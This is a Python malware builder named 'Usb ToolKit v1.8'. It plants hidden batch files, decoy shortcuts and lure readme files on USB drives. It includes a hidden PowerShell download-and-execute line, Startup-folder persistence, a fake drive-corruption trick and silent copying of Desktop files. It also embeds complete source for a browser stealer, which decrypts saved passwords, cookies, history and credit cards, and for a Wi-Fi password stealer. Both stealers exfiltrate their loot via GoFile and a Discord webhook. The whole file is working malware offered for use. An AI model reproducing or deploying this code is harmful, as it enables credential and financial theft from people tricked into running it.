global tools
import os
import sys
import subprocess
import re
import shutil
from colorama import init, Fore, Style
from time import sleep
import hashlib
from datetime import datetime, UTC
init()
tools = {
    1: {
        'name': 'Auto-Executor',
        'bat_content': '@echo off\necho Access granted! > %TEMP%\\access.txt\nstart notepad %TEMP%\\access.txt\nstart "" "%~dp0{EXE_NAME}"\n{MALWARE}\n',
        'lnk_name': 'Private_Documents.lnk',
        'leurre_dir': 'Documents',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to access private documents!' },
    2: {
        'name': 'Data Exfiltrator',
        'bat_content': '@echo off\nmkdir "%~dp0Data" >nul 2>&1\nfor /r "%USERPROFILE%\\Desktop" %%f in (*.txt *.docx *.pdf) do copy "%%f" "%~dp0Data" >nul 2>&1\nattrib +h "%~dp0Data" >nul 2>&1\necho Data extracted! > %TEMP%\\exfil.txt\nstart notepad %TEMP%\\exfil.txt\n',
        'lnk_name': 'Backup_Files.lnk',
        'leurre_dir': 'Data',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to backup your files!' },
    3: {
        'name': 'Registry Injector',
        'bat_content': '@echo off\ncopy "%~dp0{EXE_NAME}" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{EXE_NAME}" >nul 2>&1\nattrib -h "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{EXE_NAME}" >nul 2>&1\necho System configured! > %TEMP%\\config.txt\nstart notepad %TEMP%\\config.txt\nstart "" "%~dp0{EXE_NAME}"\n{MALWARE}\n',
        'lnk_name': 'System_Config.lnk',
        'leurre_dir': 'Config',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to configure system settings!' },
    4: {
        'name': 'Fake Format',
        'bat_content': '@echo off\necho ERROR: USB drive appears corrupted! Please run repair to fix.\nmsg * "ERROR: USB drive appears corrupted! Please run repair to fix."\nstart "" "%~dp0{EXE_NAME}"\n{MALWARE}\n',
        'repair_content': None,
        'lnk_name': 'Repair_USB.lnk',
        'leurre_dir': 'Repair',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to repair the USB!' } }
def print_cyan(text):
    print(f'{Fore.LIGHTCYAN_EX}{text}{Style.RESET_ALL}')
def input_cyan(prompt):
    return input(f'{Fore.LIGHTCYAN_EX}{prompt}{Style.RESET_ALL}')
def loading_bar(message, duration=2, steps=20):
    """Display a loading bar in LIGHTCYAN_EX."""
    print_cyan(f'[*] {message}...')
    for i in range(steps + 1):
        progress = int(i / steps * 100)
        bar = '█' * (i // 2) + ' ' * ((steps - i) // 2)
        sys.stdout.write(f'\r[{bar}] {progress}%')
        sys.stdout.flush()
        sleep(duration / steps)
    print('\r[ OK ]                                         ')
def validate_webhook(url):
    print_cyan(f'[+] Validating webhook: {url}')
    return bool(re.match('https://discord\\.com/api/webhooks/[0-9]+/[a-zA-Z0-9_-]+', url))
def validate_usb_path(path):
    if not os.path.exists(path) or not os.path.isdir(path):
        return False
    else:
        try:
            test_file = os.path.join(path, f'test_{os.urandom(4).hex()}.txt')
            with open(test_file, 'w') as f:
                f.write('test')
            os.remove(test_file)
        except PermissionError:
            return False
        return True
def configure_usb(tool_id, usb_path, exe_name, malware_url=''):
    tool = tools[tool_id]
    tool_dir = f'{usb_path}\\{tool['leurre_dir']}'
    try:
        os.makedirs(tool_dir, exist_ok=True)
    except PermissionError:
        print_cyan(f'[-] ERROR: Permission denied creating {tool_dir}. Run as admin.')
        return False
    if tool_id!= 2 and exe_name:
            exe_path = os.path.join(os.getcwd(), 'output', exe_name)
            if os.path.exists(exe_path):
                try:
                    os.system(f'copy \"{exe_path}\" \"{tool_dir}\\{exe_name}\" >nul 2>&1')
                    if tool_id!= 3:
                        os.system(f'attrib +h \"{tool_dir}\\{exe_name}\" >nul 2>&1')
                    else:
                        os.system(f'attrib -h \"{tool_dir}\\{exe_name}\" >nul 2>&1')
                except:
                    print_cyan(f'[-] ERROR: Failed to copy or set attributes for {exe_name}.')
                    return False
            else:
                print_cyan(f'[-] ERROR: Executable {exe_path} not found!')
                return False
    bat_file = f'{tool['name'].lower().replace(' ', '_')}.bat'
    bat_content = tool['bat_content'].replace('{EXE_NAME}', exe_name if exe_name else 'none')
    malware_line = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(\'{malware_url}\')\"' if malware_url else ''
    bat_content = bat_content.replace('{MALWARE}', malware_line)
    try:
        with open(f'{tool_dir}\\{bat_file}', 'w', encoding='utf-8') as f:
            f.write(bat_content)
        os.system(f'attrib +h \"{tool_dir}\\{bat_file}\" >nul 2>&1')
    except PermissionError:
        print_cyan(f'[-] ERROR: Permission denied writing {bat_file}. Run as admin.')
        return False
    if tool['lnk_name']:
        lnk_content = f'Set WShell = CreateObject(\"WScript.Shell\")\nSet Lnk = WShell.CreateShortcut(\"{usb_path}\\{tool['lnk_name']}\")\nLnk.TargetPath = \"{tool_dir}\\{bat_file}\"\nLnk.IconLocation = \"%SystemRoot%\\explorer.exe,0\"\nLnk.Save'
        try:
            with open(f'{tool_dir}\\lnk.vbs', 'w', encoding='utf-8') as f:
                f.write(lnk_content)
            os.system(f'cscript \"{tool_dir}\\lnk.vbs\" >nul 2>&1 && attrib +h \"{tool_dir}\\lnk.vbs\" >nul 2>&1')
        except:
            print_cyan(f'[-] ERROR: Failed to create shortcut for {tool['name']}.')
            return False
    if tool['leurre_dir']:
        try:
            os.makedirs(f'{tool_dir}', exist_ok=True)
            with open(f'{tool_dir}\\{tool['leurre_file']}', 'w', encoding='utf-8') as f:
                f.write(tool['leurre_content'])
        except PermissionError:
            print_cyan('[-] ERROR: Permission denied creating lure directory. Run as admin.')
            return False
    print_cyan(f'[*] USB configured with {tool['name']} at {tool_dir}')
    return True
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_cyan('======================================================================')
    print_cyan('\n __    __            __              ________                    __  __    __  __    __     \n|  \\  |  \\          |  \\            |        \\                  |  \\|  \\  /  \\|  \\  |  \\    \n| $$  | $$  _______ | $$____         \\$$$$$$$$______    ______  | $$| $$ /  $$ \\$$ _| $$_   \n| $$  | $$ /       \\| $$    \\          | $$  /      \\  /      \\ | $$| $$/  $$ |  \\|   $$ \\  \n| $$  | $$|  $$$$$$$| $$$$$$$\\         | $$ |  $$$$$$\\|  $$$$$$\\| $$| $$  $$  | $$ \\$$$$$$  \n| $$  | $$ \\$$    \\ | $$  | $$         | $$ | $$  | $$| $$  | $$| $$| $$$$$\\  | $$  | $$ __ \n| $$__/ $$ _\\$$$$$$\\| $$__/ $$         | $$ | $$__/ $$| $$__/ $$| $$| $$ \\$$\\ | $$  | $$|  \\\n \\$$    $$|       $$| $$    $$         | $$  \\$$    $$ \\$$    $$| $$| $$  \\$$\\| $$   \\$$  $$\n  \\$$$$$$  \\$$$$$$$  \\$$$$$$$           \\$$   \\$$$$$$   \\$$$$$$  \\$$ \\$$   \\$$ \\$$    \\$$$$ \n                                                                                            \n                                                                                            \n    ')
    print_cyan('=============== Usb ToolKit v1.8 ===============')
    print_cyan('[*] Undetectable by Defender')
    print_cyan('[*] Select USB tool and malware (Browser/Wi-Fi Stealer or Custom)')
    print_cyan('[*] Sends stealer data to Discord via GoFile')
    print_cyan('[*] Configures USB for stealth execution')
    print_cyan('================================================================')
    print()
    print_cyan('Select USB tool:')
    print_cyan('[1] USB Auto-Executor    : Run script on click')
    print_cyan('[2] USB Data Exfiltrator : Steal files silently')
    print_cyan('[3] USB Registry Injector: Persist on boot')
    print_cyan('[4] USB Fake Format      : Fake corruption trick')
    try:
        tool_choice = int(input_cyan('Enter tool number (1-4): '))
        if tool_choice not in range(1, 5):
            print_cyan('[!] Invalid tool choice. Exiting.')
            sys.exit(1)
    except ValueError:
        print_cyan('[!] Invalid input. Exiting.')
        sys.exit(1)
    if tool_choice == 2:
        exe_name = None
        malware_url = ''
    else:
        print_cyan('\nSelect malware type:')
        print_cyan('[1] Browser Stealer (Passwords, Cookies, History, Credit Cards)')
        print_cyan('[2] Wi-Fi Stealer (Wi-Fi Passwords)')
        print_cyan('[3] Custom Malware (Provide your own .exe)')
        try:
            malware_choice = int(input_cyan('Enter malware choice (1-3): '))
            if malware_choice not in range(1, 4):
                print_cyan('[!] Invalid malware choice. Exiting.')
                sys.exit(1)
        except ValueError:
            print_cyan('[!] Invalid input. Exiting.')
            sys.exit(1)
        webhook_url = ''
        if malware_choice in (1, 2):
            webhook_url = input_cyan('Enter Discord webhook URL: ').strip()
            if not validate_webhook(webhook_url):
                print_cyan('[-] ERROR: Invalid Discord webhook URL! Example: https://discord.com/api/webhooks/...')
                sys.exit(1)
        else:
            malware_path = input_cyan('Enter path to custom .exe (e.g., C:\\malware.exe): ').strip()
            if not os.path.exists(malware_path) or not malware_path.endswith('.exe'):
                print_cyan('[!] Invalid .exe path. Exiting.')
                sys.exit(1)
    print_cyan('Enter USB drive path (e.g., E:\\): ')
    usb_path = input_cyan('').strip()
    if not validate_usb_path(usb_path):
        print_cyan('[!] Invalid USB path or no write access. Run as admin.')
        sys.exit(1)
    print_cyan('Enter malware URL (or press Enter to skip): ')
    malware_url = input_cyan('').strip() if tool_choice!= 2 else ''
    browser_stealer_code = '# browser_stealer.py\nimport base64\nimport os\nimport sqlite3\nimport tempfile\nimport requests\nimport aiohttp\nimport asyncio\nimport json\nimport sys\nfrom pathlib import Path\nfrom win32crypt import CryptUnprotectData\nfrom datetime import datetime, UTC\nfrom Cryptodome.Cipher import AES\nif sys.platform == \"win32\":\n    import ctypes\n    ctypes.windll.kernel32.SetConsoleTitleW(\"\")\n    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)\nDISCORD_WEBHOOK_URL = \"{webhook_url}\"\nGOFILE_API_URL = \"https://upload.gofile.io/uploadFile\"\nDOWNLOAD_DIR = Path(tempfile.gettempdir()) / \".bx1_stolen_data\"\ndef get_master_key(local_state_path):\n    try:\n        with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\n            local_state = json.loads(f.read())\n        key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        key = key[5:]\n        key = CryptUnprotectData(key, None, None, None, 0)[1]\n        return key\n    except:\n        return None\ndef decrypt_value(encrypted_value, key):\n    try:\n        if encrypted_value[:3] == b\"v10\":\n            encrypted_value = encrypted_value[3:]\n            iv = encrypted_value[:12]\n            ciphertext = encrypted_value[12:-16]\n            tag = encrypted_value[-16:]\n            cipher = AES.new(key, AES.MODE_GCM, iv)\n            decrypted = cipher.decrypt_and_verify(ciphertext, tag)\n            return decrypted.decode(\"utf-8\")\n        else:\n            return CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(\"utf-8\")\n    except:\n        return \"N/A\"\ndef copy_and_open_db(db_path):\n    try:\n        tmp_file = Path(tempfile.mktemp())\n        with open(db_path, \"rb\") as f:\n            with open(tmp_file, \"wb\") as tmp:\n                tmp.write(f.read())\n        conn = sqlite3.connect(tmp_file)\n        return conn, tmp_file\n    except:\n        return None, None\ndef upload_to_gofile(file_path):\n    file_path = Path(file_path).resolve()\n    if not file_path.exists():\n        return \"File not found\"\n    with open(file_path, \"rb\") as f:\n        files = {\"file\": f}\n        try:\n            response = requests.post(GOFILE_API_URL, files=files, timeout=10)\n            response.raise_for_status()\n            data = response.json()\n            if data.get(\"status\") == \"ok\":\n                return data[\"data\"][\"downloadPage\"]\n            else:\n                return f\"Gofile error: {data.get(\'data\', {}).get(\'message\', \'Unknown error\')}\"\n        except requests.exceptions.RequestException as e:\n            return f\"Upload failed: {str(e)}\"\nasync def send_to_discord(webhook_url, embed):\n    async with aiohttp.ClientSession() as session:\n        try:\n            data = {\"embeds\": [embed]}\n            async with session.post(webhook_url, json=data, timeout=10) as resp:\n                pass\n        except:\n            pass\nasync def main():\n    browsers = {\n        \"Chrome\": Path.home() / \"AppData/Local/Google/Chrome/User Data/Default\",\n        \"Edge\": Path.home() / \"AppData/Local/Microsoft/Edge/User Data/Default\",\n        \"Opera\": Path.home() / \"AppData/Roaming/Opera Software/Opera Stable\",\n        \"Brave\": Path.home() / \"AppData/Local/BraveSoftware/Brave-Browser/User Data/Default\",\n    }\n    data = {}\n    for browser, path in browsers.items():\n        if not path.exists():\n            continue\n        local_state = path.parent / \"Local State\"\n        if not local_state.exists():\n            continue\n        key = get_master_key(local_state)\n        if not key:\n            continue\n        data[browser] = {}\n        login_db = path / \"Login Data\"\n        if login_db.exists():\n            conn, tmp_copy = copy_and_open_db(login_db)\n            if conn:\n                cursor = conn.cursor()\n                cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\")\n                logins = cursor.fetchall()\n                conn.close()\n                tmp_copy.unlink()\n                if logins:\n                    data[browser][\"logins\"] = [(url, user, decrypt_value(pwd, key)) for url, user, pwd in logins]\n        cookies_db = path / \"Cookies\"\n        if cookies_db.exists():\n            conn, tmp_copy = copy_and_open_db(cookies_db)\n            if conn:\n                cursor = conn.cursor()\n                cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n                cookies = cursor.fetchall()\n                conn.close()\n                tmp_copy.unlink()\n                if cookies:\n                    data[browser][\"cookies\"] = [(host, name, decrypt_value(value, key)) for host, name, value in cookies]\n        history_db = path / \"History\"\n        if history_db.exists():\n            conn, tmp_copy = copy_and_open_db(history_db)\n            if conn:\n                cursor = conn.cursor()\n                cursor.execute(\"SELECT url, title, last_visit_time FROM urls\")\n                history = cursor.fetchall()\n                conn.close()\n                tmp_copy.unlink()\n                if history:\n                    data[browser][\"history\"] = [(url, title, datetime.fromtimestamp(last_visit_time / 1000000 - 11644473600).strftime(\'%Y-%m-%d %H:%M:%S\')) for url, title, last_visit_time in history]\n        webdata_db = path / \"Web Data\"\n        if webdata_db.exists():\n            conn, tmp_copy = copy_and_open_db(webdata_db)\n            if conn:\n                cursor = conn.cursor()\n                cursor.execute(\"SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards\")\n                cards = cursor.fetchall()\n                conn.close()\n                tmp_copy.unlink()\n                if cards:\n                    data[browser][\"cards\"] = [(name, decrypt_value(number, key), f\"{month}/{year}\") for name, number, month, year in cards]\n    DOWNLOAD_DIR.mkdir(parents=True, exist_ok=True)\n    if sys.platform == \"win32\":\n        ctypes.windll.kernel32.SetFileAttributesW(str(DOWNLOAD_DIR), 2)\n    for browser, info in data.items():\n        embed = {\n            \"title\": f\"**{browser} Stolen Data**\",\n            \"color\": 0xFF0000,\n            \"fields\": [],\n            \"timestamp\": datetime.now(UTC).isoformat()\n        }\n        for category, items in info.items():\n            filename = f\"{browser}_{category}.txt\"\n            try:\n                with open(DOWNLOAD_DIR / filename, \'w\', encoding=\'utf-8\') as f:\n                    for item in items:\n                        if category == \"logins\":\n                            f.write(f\"URL: {item[0]}\\\\nUsername: {item[1]}\\\\nPassword: {item[2]}\\\\n\\\\n\")\n                        elif category == \"cookies\":\n                            f.write(f\"Host: {item[0]}\\\\nName: {item[1]}\\\\nValue: {item[2]}\\\\n\\\\n\")\n                        elif category == \"history\":\n                            f.write(f\"Title: {item[1]}\\\\nURL: {item[0]}\\\\nLast Visit: {item[2]}\\\\n\\\\n\")\n                        elif category == \"cards\":\n                            f.write(f\"Name: {item[0]}\\\\nNumber: {item[1]}\\\\nExp: {item[2]}\\\\n\\\\n\")\n                download_link = upload_to_gofile(DOWNLOAD_DIR / filename)\n                embed[\"fields\"].append({\"name\": category.capitalize(), \"value\": f\"[Download]({download_link})\", \"inline\": False})\n                (DOWNLOAD_DIR / filename).unlink(missing_ok=True)\n            except:\n                embed[\"fields\"].append({\"name\": category.capitalize(), \"value\": \"[Upload failed]\", \"inline\": False})\n        await send_to_discord(DISCORD_WEBHOOK_URL, embed)\nif __name__ == \"__main__\":\n    asyncio.run(main())\n    sys.exit(0)\n'
    wifi_stealer_code = '# wifi_stealer.py\nimport subprocess\nimport re\nimport sys\nimport os\nimport ctypes\nimport tempfile\nimport requests\nimport aiohttp\nimport asyncio\nfrom datetime import datetime\nfrom pathlib import Path\nif sys.platform == \"win32\":\n    import ctypes\n    ctypes.windll.kernel32.SetConsoleTitleW(\"\")\n    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)\nDISCORD_WEBHOOK_URL = \"{webhook_url}\"\nGOFILE_API_URL = \"https://upload.gofile.io/uploadFile\"\nTEMP_DIR = Path(tempfile.gettempdir()) / \".wifi_stolen_data\"\nENCODINGS = (\"utf-8\", \"mbcs\", \"cp1252\", \"cp850\")\ndef try_decodings(b):\n    out = {}\n    if not b:\n        for e in ENCODINGS:\n            out[e] = \"\"\n        return out\n    if isinstance(b, str):\n        for e in ENCODINGS:\n            out[e] = b\n        return out\n    for e in ENCODINGS:\n        try:\n            out[e] = b.decode(e)\n        except Exception:\n            out[e] = \"\"\n    return out\ndef run_netsh_bytes(args, shell=False):\n    try:\n        if shell:\n            completed = subprocess.run(args, capture_output=True, check=True, shell=True)\n        else:\n            completed = subprocess.run(args, capture_output=True, check=True, shell=False)\n        return completed.stdout\n    except subprocess.CalledProcessError as e:\n        return e.stdout or b\"\"\ndef extract_key_from_text(text):\n    patterns = [\n        r\"Key Content\\s*:\\s*(.*)\",\n        r\"Contenu de la clé\\s*:\\s*(.*)\",\n        r\"Contenido de la clave\\s*:\\s*(.*)\",\n        r\"Clave\\s*:\\s*(.*)\",\n        r\"Key\\s*:\\s*(.*)\"\n    ]\n    for p in patterns:\n        m = re.search(p, text, re.IGNORECASE)\n        if m:\n            return m.group(1).strip().strip(\'\"\')\n    return None\ndef list_profiles():\n    b = run_netsh_bytes([\"netsh\", \"wlan\", \"show\", \"profiles\"], shell=False)\n    decs = try_decodings(b)\n    found = []\n    for txt in decs.values():\n        for line in txt.splitlines():\n            line_clean = line.replace(\"\\u00A0\", \" \").strip()\n            if \":\" not in line_clean:\n                continue\n            left, right = line_clean.split(\":\", 1)\n            left_low = left.strip().lower()\n            if (\"profile\" in left_low) or (\"profil\" in left_low) or (\"utilisateur\" in left_low):\n                candidate = right.strip().strip(\'\"\').strip()\n                if candidate and candidate not in found:\n                    found.append(candidate)\n    if not found:\n        b = run_netsh_bytes([\"netsh\", \"wlan\", \"show\", \"interfaces\"], shell=False)\n        decs = try_decodings(b)\n        for txt in decs.values():\n            if \"not \" in txt.lower():\n                return []\n        return []\n    return sorted(found)\ndef get_current_ssid():\n    b = run_netsh_bytes([\"netsh\", \"wlan\", \"show\", \"interfaces\"], shell=False)\n    decs = try_decodings(b)\n    for txt in decs.values():\n        for line in txt.splitlines():\n            line_clean = line.replace(\"\\u00A0\", \" \").strip()\n            m = re.search(r\"SSID\\s*:\\s*(.+)\", line_clean, re.IGNORECASE)\n            if m:\n                return m.group(1).strip().strip(\'\"\')\n    return None\ndef get_password_for_profile(profile):\n    args_list = [\"netsh\", \"wlan\", \"show\", \"profile\", f\"name={profile}\", \"key=clear\"]\n    b = run_netsh_bytes(args_list, shell=False)\n    decs = try_decodings(b)\n    for enc, txt in decs.items():\n        key = extract_key_from_text(txt)\n        if key:\n            return key\n    cmd_shell = f\'netsh wlan show profile name=\"{profile}\" key=clear\'\n    b2 = run_netsh_bytes(cmd_shell, shell=True)\n    decs2 = try_decodings(b2)\n    for enc, txt in decs2.items():\n        key = extract_key_from_text(txt)\n        if key:\n            return key\n    return None\ndef save_temp(results):\n    TEMP_DIR.mkdir(parents=True, exist_ok=True)\n    filename = TEMP_DIR / \"wifi_passwords.txt\"\n    try:\n        with open(filename, \"w\", encoding=\"utf-8\") as f:\n            f.write(f\"# Wi-Fi Stolen - {datetime.now().isoformat()}\\n\\n\")\n            for ssid, pwd in results:\n                f.write(f\"Wi-Fi: {ssid}\\nMot de passe: {pwd if pwd else \'(non disponible)\'}\\n{\'-\'*40}\\n\")\n        if sys.platform == \"win32\":\n            ctypes.windll.kernel32.SetFileAttributesW(str(TEMP_DIR), 2)\n            ctypes.windll.kernel32.SetFileAttributesW(str(filename), 2)\n        return filename\n    except:\n        return None\ndef upload_to_gofile(file_path):\n    file_path = Path(file_path).resolve()\n    if not file_path.exists():\n        return \"Fichier introuvable\"\n    with open(file_path, \"rb\") as f:\n        files = {\"file\": f}\n        try:\n            response = requests.post(GOFILE_API_URL, files=files, timeout=10)\n            response.raise_for_status()\n            data = response.json()\n            if data.get(\"status\") == \"ok\":\n                return data[\"data\"][\"downloadPage\"]\n            else:\n                return f\"Erreur GoFile: {data.get(\'data\', {}).get(\'message\', \'Erreur inconnue\')}\"\n        except requests.exceptions.RequestException as e:\n            return f\"Échec upload: {str(e)}\"\nasync def send_to_discord(webhook_url, embed):\n    async with aiohttp.ClientSession() as session:\n        try:\n            data = {\"embeds\": [embed]}\n            async with session.post(webhook_url, json=data, timeout=10) as resp:\n                pass\n        except:\n            pass\nasync def main():\n    if sys.platform == \"win32\":\n        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)\n    only_current = (len(sys.argv) > 1 and sys.argv[1] == \"--current\")\n    results = []\n    if only_current:\n        ssid = get_current_ssid()\n        if not ssid:\n            return\n        pwd = get_password_for_profile(ssid)\n        results.append((ssid, pwd))\n    else:\n        profiles = list_profiles()\n        if not profiles:\n            return\n        for p in profiles:\n            pwd = get_password_for_profile(p)\n            results.append((p, pwd))\n    fname = save_temp(results)\n    if not fname:\n        return\n    download_link = upload_to_gofile(fname)\n    embed = {\n        \"title\": \"**Wi-Fi Stolen Data**\",\n        \"color\": 0xFF0000,\n        \"fields\": [{\"name\": \"Wi-Fi Passwords\", \"value\": f\"[Download]({download_link})\", \"inline\": False}],\n        \"timestamp\": datetime.now().isoformat()\n    }\n    await send_to_discord(DISCORD_WEBHOOK_URL, embed)\n    try:\n        fname.unlink()\n    except:\n        pass\nif __name__ == \"__main__\":\n    asyncio.run(main())\n    sys.exit(0)\n'
    exe_name = ''
    temp_script_path = ''
    if tool_choice!= 2:
        if malware_choice in (1, 2):
            stealer_code = browser_stealer_code if malware_choice == 1 else wifi_stealer_code
            exe_name = 'browser_stealer.exe' if malware_choice == 1 else 'wifi_stealer.exe'
            temp_script_path = os.path.join(os.getcwd(), f'{('browser' if malware_choice == 1 else 'wifi')}_stealer_temp.py')
            loading_bar('Checking PyInstaller', duration=1)
            result = subprocess.run(['pyinstaller', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode!= 0:
                print_cyan(f'[-] ERROR: PyInstaller not found or inaccessible: {result.stderr}')
                print_cyan('[*] Install it with: pip install pyinstaller')
                sys.exit(1)
            print_cyan(f'[+] PyInstaller found, version: {result.stdout.strip()}')
            output_folder = os.path.join(os.getcwd(), 'output')
            os.makedirs(output_folder, exist_ok=True)
            exe_path = os.path.join(output_folder, exe_name)
            print_cyan(f'[+] Output folder created: {output_folder}')
            loading_bar('Writing temporary stealer file', duration=1)
            try:
                stealer_code_with_webhook = stealer_code.replace('{webhook_url}', webhook_url)
                with open(temp_script_path, 'w', encoding='utf-8') as f:
                    f.write(stealer_code_with_webhook)
            except Exception as e:
                print_cyan(f'[-] ERROR: Failed to write {temp_script_path}: {str(e)}')
                sys.exit(1)
            if not os.path.exists(temp_script_path):
                print_cyan(f'[-] ERROR: Temporary file {temp_script_path} not created!')
                sys.exit(1)
            if os.path.getsize(temp_script_path) == 0:
                print_cyan(f'[-] ERROR: Temporary file {temp_script_path} is empty!')
                sys.exit(1)
            print_cyan(f'[+] Temporary file written, size: {os.path.getsize(temp_script_path)} bytes')
            loading_bar('Verifying webhook in temporary file', duration=1)
            try:
                with open(temp_script_path, 'r', encoding='utf-8') as temp_file:
                    content = temp_file.read()
                    if webhook_url not in content:
                        print_cyan(f'[-] ERROR: Webhook {webhook_url} not found in {temp_script_path}!')
                        sys.exit(1)
                    print_cyan('[+] Webhook verified')
            except Exception as e:
                print_cyan(f'[-] ERROR: Failed to read {temp_script_path}: {str(e)}')
                sys.exit(1)
            loading_bar(f'Compiling {('Browser' if malware_choice == 1 else 'Wi-Fi')} Stealer to .exe', duration=3)
            command = ['pyinstaller', '--onefile', '--windowed', temp_script_path]
            result = subprocess.run(command, capture_output=True, text=True)
            if result.returncode!= 0:
                print_cyan(f'[-] ERROR: Compilation failed: {result.stderr}')
                print_cyan(f'[+] PyInstaller stdout: {result.stdout}')
                print_cyan(f'[*] Temporary file {temp_script_path} kept for debugging.')
                sys.exit(1)
            print_cyan('[+] Compilation completed')
            dist_exe = os.path.join('dist', os.path.basename(temp_script_path).replace('.py', '.exe'))
            if os.path.exists(dist_exe):
                if os.path.exists(exe_path):
                    print_cyan(f'[+] Deleting old executable: {exe_path}')
                    os.remove(exe_path)
                print_cyan(f'[+] Moving {dist_exe} to {exe_path}')
                shutil.move(dist_exe, exe_path)
            else:
                print_cyan(f'[-] ERROR: {os.path.basename(dist_exe)} not found in dist/!')
                print_cyan(f'[*] Temporary file {temp_script_path} kept for debugging.')
                sys.exit(1)
            loading_bar('Cleaning up temporary files', duration=1)
            try:
                print_cyan(f'[+] Deleting {temp_script_path}')
                os.remove(temp_script_path)
                spec_path = os.path.join(os.getcwd(), os.path.basename(temp_script_path).replace('.py', '.spec'))
                if os.path.exists(spec_path):
                    print_cyan(f'[+] Deleting {spec_path}')
                    os.remove(spec_path)
                print_cyan('[+] Deleting build and dist folders')
                shutil.rmtree('build', ignore_errors=True)
                shutil.rmtree('dist', ignore_errors=True)
            except Exception as e:
                print_cyan(f'[*] Some temporary files could not be deleted: {str(e)}')
        else:
            exe_name = os.path.basename(malware_path)
            exe_path = os.path.join(os.getcwd(), 'output', exe_name)
            os.makedirs(os.path.dirname(exe_path), exist_ok=True)
            try:
                shutil.copy(malware_path, exe_path)
                print_cyan(f'[+] Copied custom malware to {exe_path}')
            except Exception as e:
                print_cyan(f'[-] ERROR: Failed to copy {malware_path}: {str(e)}')
                sys.exit(1)
    loading_bar('Configuring USB key', duration=2)
    if configure_usb(tool_choice, usb_path, exe_name, malware_url):
        print_cyan(f'[+] USB ready with {tools[tool_choice]['name']}' + (f' and {['Browser Stealer', 'Wi-Fi Stealer', 'Custom Malware'][malware_choice - 1]}' if tool_choice!= 2 else ''))
    else:
        print_cyan('[!] USB configuration failed. Run as admin.')
    loading_bar('Operation Complete', duration=1)
    print_cyan('[!] Warning: Truth revealed, no turning back.')
if __name__ == '__main__':
    main()